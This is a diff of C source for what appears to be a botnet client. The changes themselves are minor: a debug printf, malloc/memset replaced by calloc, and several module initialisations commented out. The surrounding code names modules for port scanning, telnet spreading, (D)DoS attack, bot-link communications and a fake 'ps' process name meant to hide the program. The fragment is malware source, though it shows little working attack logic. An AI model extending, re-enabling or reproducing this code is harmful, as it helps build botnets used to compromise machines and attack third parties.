@@ -449,6 +449,8 @@ void network_main_loop(Modules *mptr) {
     for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
         // do we have an incoming queue to deal with?
         if (cptr->incoming != NULL) {
+            printf("incoming data\n");
+            
             // lets attempt to merge messages that may be fragmented in the queue
             QueueMerge(&cptr->incoming);  
             
@@ -707,13 +709,12 @@ char *QueueParseAscii(Queue *qptr, int *size) {
 
             if (i < qptr->size) {
                 n = qptr->size - i + 1;
-                newbuf = (char *)malloc(n+1);
+                newbuf = (char *)calloc(n+1, 1);
                 
                 if (newbuf == NULL) {
                     //printf("couldnt alloc %d - %d\n", n, errno);
                     return NULL;
                 }
-                memset(newbuf, 0, n);
                 memcpy(newbuf, qptr->buf + i, qptr->size - i);
                 
                 qptr->buf = newbuf;
@@ -1173,11 +1174,10 @@ ExternalModules *ExternalAdd(int id, char *buf, int size, int initialize) {
 
 void *CustomPtr(Connection *cptr, int custom_size) {
     if (cptr->buf == NULL) {
-        if ((cptr->buf = (char *)malloc(custom_size + 1)) == NULL)
-            return NULL;
-        
-        memset(cptr->buf, 0, custom_size);
+        if ((cptr->buf = (char *)calloc(custom_size + 1, 1)) == NULL)
+            return NULL;        
     }
+
     return (void *)cptr->buf;
 }
 
@@ -1193,9 +1193,9 @@ int main(int argc, char *argv[]) {
     //namecoin_init(&module_list);
     //peercoin_init(&module_list);
     // portscan should be before anything using it..
-    portscan_init(&module_list);
+    //portscan_init(&module_list);
     // ensure any following modules enable portscans in init
-    telnet_init(&module_list);
+    //telnet_init(&module_list);
     // initialize module for (D)DoS
     //attack_init(&module_list);
     // http servers
@@ -1203,12 +1203,12 @@ int main(int argc, char *argv[]) {
     // bot link / communications
     //botlink_init(&module_list);
     // internal data storage
-    data_init(&module_list);
+    //data_init(&module_list);
     // management
     //MGR_init(&module_list);
     
     // fake name for 'ps'
-    fakename_init(&module_list, argv, argc);
+    //fakename_init(&module_list, argv, argc);
     
     // main loop
     while (1) {
